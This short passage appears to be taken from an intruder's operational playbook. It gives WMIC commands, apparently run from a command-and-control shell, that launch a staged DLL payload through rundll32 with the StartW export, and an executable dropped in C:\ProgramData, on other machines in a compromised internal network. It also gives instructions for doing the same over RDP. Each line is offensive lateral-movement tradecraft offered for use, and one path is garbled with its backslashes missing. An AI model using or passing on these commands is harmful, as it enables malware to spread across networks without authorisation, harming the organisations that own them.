We use it more often to launch VMICOM

shell wmic /node:192.168.104.13 process call create "rundll32.exe C:\ProgramData\x64.dll StartW"

Accordingly, where is the IP, insert the IP machine on which we have access, then there is the way and the name of our dll, I think the syntax is clear

If you are on the RDP > open cmd from admin and rundll32.exe C:ProgramDatax64.dll,StartW can actually specify any, according to where your dll lies

shell wmic /node:10.28.0.3 process call create "C:\ProgramData\j1.exe"
